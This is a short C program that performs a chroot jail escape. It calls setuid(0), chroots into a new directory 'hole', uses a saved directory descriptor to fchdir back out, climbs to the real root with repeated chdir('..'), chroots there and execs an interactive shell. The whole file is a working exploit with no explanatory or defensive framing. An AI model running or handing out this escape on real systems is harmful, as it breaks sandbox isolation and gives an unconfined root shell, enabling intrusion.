#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <stdio.h>
#include <string.h>

#define TEMP_DIR "hole"

extern int errno;

int main() {

    int dir_fd, x, err_num;
    setuid(0);

    if (mkdir(TEMP_DIR, 0755) < 0) {
      err_num = errno;
      fprintf(stderr, "Failed to create directory: %s\n", strerror(err_num));
      return 1;
    }
    // grab a reference to the current directory
    // since chroot() will change it
    dir_fd = open(".", O_RDONLY);

    if (chroot(TEMP_DIR) < 0) {
      err_num = errno;
      fprintf(stderr, "Failed to chroot: %s\n", strerror(err_num));
      return 1;
    }

       // chroot didn't close the dir_fd, so we can
    // use it to switch back to the previous
    // directory
    fchdir(dir_fd);
    close(dir_fd);

    // climb up to the top of the directory enough times
    for(x = 0; x < 1000; x++) {
      chdir("..");
    }

    chroot(".");

    return execl("/bin/sh", "-i", NULL);
}
